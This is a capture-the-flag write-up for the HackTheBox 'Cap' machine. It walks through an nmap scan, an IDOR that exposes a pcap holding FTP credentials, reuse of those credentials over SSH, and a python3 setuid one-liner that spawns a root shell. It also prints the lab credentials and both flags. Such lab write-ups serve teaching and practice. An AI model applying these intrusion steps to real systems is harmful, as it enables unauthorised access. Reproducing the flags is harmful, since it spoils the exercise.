---
title: Cap HackTheBox Machine Writeup and Walkthrough
author: Gaurav Raj
date: 2021-06-10 13:30:00 +0800
categories: [CTF, HackTheBox]
tags: [ctf, hackthebox, htb, writeup, walkthrough, ftp, ssh, gunicorn, python, python3, suid, euid]
image:
  src: /assets/cap/banner.png
  alt: Cap HackTheBox Banner Image

---

## Cap
> HackTheBox Easy Level Machine

## Nmap Scan
```bash
# Nmap 7.91 scan initiated Thu Jun 10 11:56:18 2021 as: nmap -sC -sV -A -v -oN nmap/initial 10.10.10.245
Nmap scan report for 10.10.10.245
Host is up (0.20s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    gunicorn
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     Server: gunicorn
|     Date: Thu, 10 Jun 2021 06:39:00 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Thu, 10 Jun 2021 06:38:52 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 19386
|     <!DOCTYPE html>
|     <html class="no-js" lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Security Dashboard</title>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <link rel="shortcut icon" type="image/png" href="/static/images/icon/favicon.ico">
|     <link rel="stylesheet" href="/static/css/bootstrap.min.css">
|     <link rel="stylesheet" href="/static/css/font-awesome.min.css">
|     <link rel="stylesheet" href="/static/css/themify-icons.css">
|     <link rel="stylesheet" href="/static/css/metisMenu.css">
|     <link rel="stylesheet" href="/static/css/owl.carousel.min.css">
|     <link rel="stylesheet" href="/static/css/slicknav.min.css">
|     <!-- amchar
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Thu, 10 Jun 2021 06:38:54 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Allow: OPTIONS, GET, HEAD
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Content-Type: text/html
|     Content-Length: 196
|     <html>
|     <head>
|     <title>Bad Request</title>
|     </head>
|     <body>
|     <h1><p>Bad Request</p></h1>
|     Invalid HTTP Version &#x27;Invalid HTTP Version: &#x27;RTSP/1.0&#x27;&#x27;
|     </body>
|_    </html>
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD
|_http-server-header: gunicorn
|_http-title: Security Dashboard
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.91%I=7%D=6/10%Time=60C1B0AC%P=x86_64-unknown-linux-gnu%r
SF:(GetRequest,2FE5,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate
SF::\x20Thu,\x2010\x20Jun\x202021\x2006:38:52\x20GMT\r\nConnection:\x20clo
SF:se\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x
SF:2019386\r\n\r\n<!DOCTYPE\x20html>\n<html\x20class=\"no-js\"\x20lang=\"e
SF:n\">\n\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x
SF:20\x20<meta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n
SF:\x20\x20\x20\x20<title>Security\x20Dashboard</title>\n\x20\x20\x20\x20<
SF:meta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-s
SF:cale=1\">\n\x20\x20\x20\x20<link\x20rel=\"shortcut\x20icon\"\x20type=\"
SF:image/png\"\x20href=\"/static/images/icon/favicon\.ico\">\n\x20\x20\x20
SF:\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/bootstrap\.min\.c
SF:ss\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/cs
SF:s/font-awesome\.min\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\
SF:"\x20href=\"/static/css/themify-icons\.css\">\n\x20\x20\x20\x20<link\x2
SF:0rel=\"stylesheet\"\x20href=\"/static/css/metisMenu\.css\">\n\x20\x20\x
SF:20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/owl\.carousel\.
SF:min\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/sta
SF:tic/css/slicknav\.min\.css\">\n\x20\x20\x20\x20<!--\x20amchar")%r(HTTPO
SF:ptions,B3,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Th
SF:u,\x2010\x20Jun\x202021\x2006:38:54\x20GMT\r\nConnection:\x20close\r\nC
SF:ontent-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20OPTIONS,\x20GE
SF:T,\x20HEAD\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,121,"HTTP/1\
SF:.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x2
SF:0text/html\r\nContent-Length:\x20196\r\n\r\n<html>\n\x20\x20<head>\n\x2
SF:0\x20\x20\x20<title>Bad\x20Request</title>\n\x20\x20</head>\n\x20\x20<b
SF:ody>\n\x20\x20\x20\x20<h1><p>Bad\x20Request</p></h1>\n\x20\x20\x20\x20I
SF:nvalid\x20HTTP\x20Version\x20&#x27;Invalid\x20HTTP\x20Version:\x20&#x27
SF:;RTSP/1\.0&#x27;&#x27;\n\x20\x20</body>\n</html>\n")%r(FourOhFourReques
SF:t,189,"HTTP/1\.0\x20404\x20NOT\x20FOUND\r\nServer:\x20gunicorn\r\nDate:
SF:\x20Thu,\x2010\x20Jun\x202021\x2006:39:00\x20GMT\r\nConnection:\x20clos
SF:e\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2
SF:0232\r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x203\.
SF:2\x20Final//EN\">\n<title>404\x20Not\x20Found</title>\n<h1>Not\x20Found
SF:</h1>\n<p>The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x
SF:20server\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\
SF:x20check\x20your\x20spelling\x20and\x20try\x20again\.</p>\n");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jun 10 11:59:15 2021 -- 1 IP address (1 host up) scanned in 176.55 seconds
```

## HTTP Enumeration
While Enumerating the site found an endpoint pointing to some type of `pcap` file which can be interesting for us. but when visiting to the actual endpoint found that the url used for accessing the `pcap` file is `http://cap.htb/data/14` which doesn't have any packets or data. so changed the url from `http://cap.htb/data/14` to `http://cap.htb/data/0` which got us a `pcap` file which actually contains some information. So downloaded it and start analyzing it.

![](/assets/cap/Pasted image 20210610125436.png)

### Analyzing the PCAP file
While Analyzing the `PCAP` file, we got the `FTP` credentials.
![](/assets/cap/Pasted image 20210610130443.png)

- FTP TCP Stream
	![](/assets/cap/Pasted image 20210610130557.png)	

#### Creds
```bash
nathan:Buck3tH4TF0RM3!
```

## Accessing the FTP
After Logging in the ftp, noticed that the whole filesystem is accessible.

## Getting User Access
After trying the `FTP` credentials against `SSH`, we got the access as user `nathan`.
![](/assets/cap/Pasted image 20210610131323.png)

### User Flag
```bash
3498bd1cb84249bc6929f298e7a26892
```

## Privilege Escalation
### Getting Root Shell
```bash
nathan@cap:~$ python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# id
uid=0(root) gid=1001(nathan) groups=1001(nathan)
# cat /root/root.txt
e271e8035aaf55afd2a22ea4e232b35f
#
```
![](/assets/cap/Pasted image 20210610132128.png)

### Root Flag
```bash
e271e8035aaf55afd2a22ea4e232b35f
```

Here we completed our Machine.
## Completed
![](/assets/cap/Pasted image 20210610132516.png)
